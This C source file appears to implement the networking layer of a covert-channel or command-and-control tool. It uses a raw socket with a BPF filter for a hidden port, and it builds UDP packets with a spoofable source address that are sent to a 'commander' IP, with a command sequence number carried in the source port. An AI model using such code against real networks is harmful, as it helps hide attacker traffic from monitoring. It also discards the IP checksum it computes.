#include "network.h"

#include <arpa/inet.h>
#include <errno.h>
#include <linux/filter.h>
#include <linux/socket.h>
#include <linux/if_ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>


#define PKT_MAX_LEN 4096
#define IP_VERSION 4
#define IP_IHL 5             // 5 * 32-bit words = 20 bytes
#define IP_FRAG_OFF 0
#define IP_HDR_TOS 0
#define IP_HDR_TTL 64

void print_packet_info(uint8_t *packet) {
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    uint8_t *payload = (uint8_t *)udp + sizeof(struct udphdr);

    char src_ip[INET_ADDRSTRLEN];
    char dst_ip[INET_ADDRSTRLEN];

    inet_ntop(AF_INET, &ip->saddr, src_ip, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &ip->daddr, dst_ip, INET_ADDRSTRLEN);

    uint16_t ip_len = ntohs(ip->tot_len);
    uint16_t udp_len = ntohs(udp->len);
    uint16_t payload_len = udp_len - sizeof(struct udphdr);

    printf("-----------------------Packet Info-----------------------\n");

    printf("IP Header:\n");
    printf("  Version        : %u\n", ip->version);
    printf("  Header Length  : %u bytes\n", ip->ihl * 4);
    printf("  TOS            : %u\n", ip->tos);
    printf("  Total Length   : %u\n", ip_len);
    printf("  ID             : %u\n", ntohs(ip->id));
    printf("  TTL            : %u\n", ip->ttl);
    printf("  Protocol       : %u\n", ip->protocol);
    printf("  Source IP      : %s\n", src_ip);
    printf("  Destination IP : %s\n", dst_ip);

    printf("\nUDP Header:\n");
    printf("  Source Port    : %u\n", ntohs(udp->source));
    printf("  Dest Port      : %u\n", ntohs(udp->dest));
    printf("  Length         : %u\n", udp_len);

    printf("\nPayload (%u bytes):\n", payload_len);
    for (uint16_t i = 0; i < payload_len; i++) {
        printf("%02x ", payload[i]);
        if ((i + 1) % 16 == 0)
            printf("\n");
    }

    if (payload_len % 16 != 0)
        printf("\n");

    printf("---------------------------------------------------------\n");
}

int setup_covert_fd() {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (fd == -1) {
        fprintf(stderr, "covert socket() failed\n");
        return -1;
    }

    int one = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "setsockopt(IPPROTO_IP, IP_HDRINCL) failed\n");
        return -1;
    }

    struct sock_filter code[] = {

        BPF_STMT(BPF_LD  | BPF_B | BPF_ABS, 9),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, IPPROTO_UDP, 0, 5),

        BPF_STMT(BPF_LD  | BPF_B | BPF_ABS, 0),
        BPF_STMT(BPF_ALU | BPF_AND | BPF_K, 0x0F),
        BPF_STMT(BPF_ALU | BPF_LSH | BPF_K, 2),

        BPF_STMT(BPF_LD  | BPF_H | BPF_IND, 2),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, htons(COVERT_CHAN), 0, 1),

        BPF_STMT(BPF_RET | BPF_K, 0xFFFFFFFF),
        BPF_STMT(BPF_RET | BPF_K, 0),
    };

    struct sock_fprog bpf = {
        .len = sizeof(code) / sizeof(code[0]),
        .filter = code,
    };

    if (setsockopt(fd, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf)) < 0) {
        fprintf(stderr, "setsockopt(SO_ATTACH_FILTER) failed\n");
        return -1;
    }

    return fd;
}

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;

    for (; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short) (~sum);
}

int send_packet(struct Context *ctx, const char *ip_src_addr) {
    uint8_t packet[PKT_MAX_LEN] = {0};

    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    uint8_t *payload = (uint8_t *) udp + sizeof (struct udphdr);
    const uint16_t payload_size = rand_payload(ctx, payload);
    const uint16_t pkt_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;

    ip->ihl = IP_IHL;
    ip->version = IP_VERSION;
    ip->tos = IP_HDR_TOS;
    ip->tot_len = htons(pkt_len);
    ip->id = htons(rand_u16(ctx));
    ip->frag_off = IP_FRAG_OFF;
    ip->ttl = IP_HDR_TTL;
    ip->protocol = IPPROTO_UDP;
    ip->saddr = inet_addr(ip_src_addr);
    ip->daddr = inet_addr(ctx->commander_ip);
    checksum(ip, ip->ihl * 4);
    udp->source = htons(ctx->cmd_seq_num);
    udp->dest = htons(COVERT_CHAN);
    udp->len = htons(sizeof(struct udphdr) + payload_size);
    udp->check = 0;

    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    dest.sin_port = htons(COVERT_CHAN);
    dest.sin_addr.s_addr = ip->daddr;

    int ret = sendto(ctx->covert_fd, packet, pkt_len, 0, (struct sockaddr *)&dest, sizeof(dest));
    if (ret <= 0) {
        fprintf(stderr, "sento error\n");
    }
    print_packet_info(packet);
    (ctx->cmd_seq_num)++;

    return 0;
}